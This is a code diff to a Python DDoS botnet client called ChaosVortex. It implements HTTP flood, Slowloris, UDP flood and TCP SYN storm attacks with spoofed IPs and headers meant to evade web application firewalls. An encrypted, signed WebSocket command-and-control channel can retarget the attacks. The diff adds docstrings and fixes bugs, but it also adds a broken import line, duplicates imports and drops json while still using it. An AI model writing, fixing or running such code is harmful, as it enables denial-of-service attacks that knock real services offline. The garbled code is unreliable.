@@ -6,16 +6,18 @@ import random
 import string
 import time
 import argparse
-import logging
+import logging import logger
 import os
 import base64
-import json
 import websocket
 import zlib
+import time
+import argparse
 from typing import List, Dict
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization, hashes
+from typing import List, Dict
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives.hmac import HMAC
 from cryptography.hazmat.backends import default_backend
@@ -28,14 +30,15 @@ logger = logging.getLogger(__name__)
 log_buffer = []
 
 class ChaosVortex:
-    def __init__(self, targets_l7: List[str] = None, targets_l4: List[str] = None, duration: int = 60, threads: int = 60, methods: List[str] = None, c2_url: str = None):
-        self.targets_l7 = [t.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0] for t in (targets_l7 or [])]
+    def __init__(self, targets_l7: List[str] = None, targets_l4: List[str] = None, duration: int = 60, threads: int = 30, methods: List[str] = None, c2_url: str = None):
+        """Initialize ChaosVortex."""
+        self.targets_l7 = [t.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0].strip() for t in (targets_l7 or [])]
         self.targets_l4 = targets_l4 or []
         self.duration = duration
-        self.threads = max(1, min(threads, 60))
+        self.threads = max(1, min(threads, 30))  # Limit to avoid Replit overload
         self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
         self.end_time = time.time() + duration
-        self.c2_url = c2_url or "ws://localhost:8765"
+        self.c2_url = c2_url or "ws://127.0.0.1:8000"  # Use localhost explicitly
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
@@ -91,11 +94,13 @@ class ChaosVortex:
         return False
 
     def _sign_command(self, data: bytes) -> bytes:
+        """HMAC command signature."""
         hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         return hmac.finalize()
 
     def _verify_command(self, data: bytes, signature: bytes) -> bool:
+        """Verify HMAC signature."""
         hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         try:
@@ -105,6 +110,7 @@ class ChaosVortex:
             return False
 
     def _encrypt(self, data: bytes) -> bytes:
+        """AES-GCM with 12-byte nonce and compression."""
         compressed = zlib.compress(data)
         iv = os.urandom(12)
         self.c2_nonce = (self.c2_nonce + 1) % (2**64)
@@ -116,6 +122,7 @@ class ChaosVortex:
         return base64.b64encode(iv + encryptor.tag + nonce_bytes + ciphertext)
 
     def _decrypt(self, data: bytes) -> bytes:
+        """AES-GCM decryption with decompression."""
         try:
             data = base64.b64decode(data)
             iv, tag, nonce_bytes, ciphertext = data[:12], data[12:28], data[28:40], data[40:]
@@ -129,6 +136,7 @@ class ChaosVortex:
             raise
 
     def _c2_command(self) -> dict:
+        """Fetch C2 commands with signature verification."""
         try:
             cmd_data = json.dumps({"status": "ready", "heartbeat": int(time.time())}).encode()
             signature = self._sign_command(cmd_data)
@@ -148,6 +156,7 @@ class ChaosVortex:
         return {"command": "continue"}
 
     def _random_payload(self, size: int = 48) -> bytes:
+        """Valid HTTP/UDP-mimicking payload."""
         valid_prefixes = [
             b"GET / HTTP/1.1\r\nHost: ",
             b"POST /api/data HTTP/1.1\r\nContent-Length: ",
@@ -158,6 +167,7 @@ class ChaosVortex:
         return prefix + suffix[:size - len(prefix)]
 
     def _random_path(self) -> str:
+        """Realistic WAF-evading paths."""
         prefixes = ["api/v4", "rest/v2", "graphql/query", "assets/js", "public/css"]
         segments = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) for _ in range(1)]
         exts = [".json", ".js", ".css", ".html", ""]
@@ -165,9 +175,11 @@ class ChaosVortex:
         return f"/{random.choice(prefixes)}/{'/'.join(segments)}{random.choice(exts)}{query}"
 
     def _random_ip(self) -> str:
+        """Spoofed IP."""
         return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
 
     def _random_headers(self, target: str) -> dict:
+        """WAF-evading headers with JA3 spoofing."""
         headers = {
             "User-Agent": random.choice(self.user_agents),
             "X-Forwarded-For": self._random_ip(),
@@ -183,16 +195,19 @@ class ChaosVortex:
         return headers
 
     def _shuffle_targets(self, layer: str) -> List[str]:
+        """Per-thread target shuffling."""
         with self.lock:
             targets = self.target_pools[layer][:]
         random.shuffle(targets)
         return targets or [None]
 
     def _update_load(self, method: str, success: bool):
+        """Update method load for balancing."""
         with self.lock:
             self.method_load[method] = self.method_load.get(method, 0.5) * 0.9 + (1.0 if success else 0.0) * 0.1
 
     def _vortexhttp(self):
+        """L7: High-impact HTTP flood."""
         targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -222,6 +237,7 @@ class ChaosVortex:
                 self._update_load("vortexhttp", False)
 
     def _ghostloris(self):
+        """L7: Stealth Slowloris with socket exhaustion."""
         targets = self._shuffle_targets("l7")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -259,6 +275,7 @@ class ChaosVortex:
                 self._update_load("ghostloris", False)
 
     def _udpvortex(self):
+        """L4: UDP high-impact with protocol mimicry."""
         targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -284,6 +301,7 @@ class ChaosVortex:
                 self._update_load("udpvortex", False)
 
     def _tcpvortex(self):
+        """L4: TCP SYN storm with packet crafting."""
         targets = self._shuffle_targets("l4")
         while time.time() < self.end_time:
             target = random.choice(targets)
@@ -309,6 +327,7 @@ class ChaosVortex:
                 self._update_load("tcpvortex", False)
 
     def _balance_threads(self):
+        """Dynamic thread load balancing."""
         total_load = sum(self.method_load.values()) or 1.0
         thread_alloc = {m: max(1, int(self.threads * (self.method_load[m] / total_load))) for m in self.methods}
         remaining = self.threads - sum(thread_alloc.values())
@@ -319,6 +338,7 @@ class ChaosVortex:
         return thread_alloc
 
     def start(self):
+        """Unleash the chaos vortex."""
         if not self.targets_l7 and not self.targets_l4:
             log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "At least one target required"})
             logger.error("At least one target required")
@@ -326,8 +346,8 @@ class ChaosVortex:
         with self.lock:
             self.target_pools["l7"] = self.targets_l7[:]
             self.target_pools["l4"] = self.targets_l4[:]
-        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"ChaosV strike on L7: {self.targets_l7 or ''}, L4: {self.target_pools['l4'] or ''}, methods: {self.methods}"})
-        logger.info(f"ChaosV strike on L7: {self.targets_l7 or ''}, L4: {self.target_pools['l4'] or ''}, methods: {self.methods}")
+        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"ChaosVortex strike on L7: {self.targets_l7 or 'None'}, L4: {self.targets_l4 or 'None'}, methods: {self.methods}"})
+        logger.info(f"ChaosVortex strike on L7: {self.targets_l7 or 'None'}, L4: {self.targets_l4 or 'None'}, methods: {self.methods}")
         if not self._init_c2_session():
             log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 initialization failed, continuing offline"})
             logger.info("C2 initialization failed, continuing offline")
@@ -342,7 +362,7 @@ class ChaosVortex:
                 "udpvortex": self._udpvortex,
                 "tcpvortex": self._tcpvortex
             }
-            for method, count in sorted(thread_alloc.items()):
+            for method, count in thread_alloc.items():
                 for _ in range(count):
                     t = threading.Thread(target=method_funcs[method], daemon=True)
                     threads.append(t)
@@ -353,8 +373,8 @@ class ChaosVortex:
                 t.join(timeout=1.0)
             time.sleep(0.1)
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
-        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Vortex completed. Success counts: {self.success_count}, Avg response: {avg_response}"})
-        logger.info(f"Vortex completed. Success counts: {self.success_count}, Avg response: {avg_response}")
+        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}"})
+        logger.info(f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
         if self.c2_session:
             try:
                 compressed_log = zlib.compress(json.dumps(log_buffer[-5:]).encode())
@@ -366,6 +386,7 @@ class ChaosVortex:
                 logger.error(f"Failed to send final log to C2: {str(e)}")
 
     def _c2_monitor(self):
+        """Monitor C2 with signed commands."""
         while time.time() < self.end_time:
             cmd = self._c2_command()
             if cmd.get("command") == "stop":
@@ -375,27 +396,28 @@ class ChaosVortex:
             elif cmd.get("command") == "update_methods":
                 with self.lock:
                     self.methods = [m for m in cmd.get("methods", self.methods) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
-                    logger.info(f"Updated methods: {self._methods}")
+                    logger.info(f"Updated methods: {self.methods}")
             elif cmd.get("command") == "update_targets":
                 with self.lock:
                     self.target_pools["l7"] = cmd.get("targets_l7", self.target_pools["l7"])
                     self.target_pools["l4"] = cmd.get("targets_l4", self.target_pools["l4"])
                     logger.info(f"Updated targets: L7={self.target_pools['l7']}, L4={self.target_pools['l4']}")
-            time.sleep(random.uniform(0.1, 1.0))
+            time.sleep(random.uniform(0.1, 0.8))
 
-def main(targets_l7: str, targets_l4: str, duration: str, methods: str, c2_url: str):
-    targets_l7 = targets_l7.split(",") if targets_l7 else []
-    targets_l4 = targets_l4.split(",") if targets_l4 else []:
-    methods = methods.split(",") if methods else []]
-    vortex = ChaosVortex(targets_l7, targets_l4, duration, methods=methods, c2_url=c2_url)
+def main(targets_l7: str, targets_l4: str, duration: int, methods: str, c2_url: str):
+    """Main function to parse arguments and start attack."""
+    targets_l7 = targets_l7.split(",") if targets_l7 and targets_l7 != "none" else []
+    targets_l4 = targets_l4.split(",") if targets_l4 and targets_l4 != "none" else []
+    methods = methods.split(",") if methods else []
+    vortex = ChaosVortex(targets_l7, targets_l4, duration, threads=30, methods=methods, c2_url=c2_url)
     vortex.start()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ChaosVortex Botnet")
     parser.add_argument("targets_l7", nargs="?", default=None, help="Comma-separated L7 targets (e.g., http://httpbin.org)")
-    parser.add_argument("targets_l4", nargs="CommaSeparated n?", default=None, help="Comma-separated L4 targets (e.g., 93.184.216.34)")
+    parser.add_argument("targets_l4", nargs="?", default=None, help="Comma-separated L4 targets (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
     parser.add_argument("--methods", type=str, default="vortexhttp,ghostloris,udpvortex,tcpvortex", help="Comma-separated methods")
-    parser.add_argument("--c2-url", type=str, default="ws://localhost:8765", help="WebSocket C2 URL")
+    parser.add_argument("--c2-url", type=str, default="ws://127.0.0.1:8765", help="WebSocket C2 URL")
     args = parser.parse_args()
     main(args.targets_l7, args.targets_l4, args.duration, args.methods, args.c2_url)
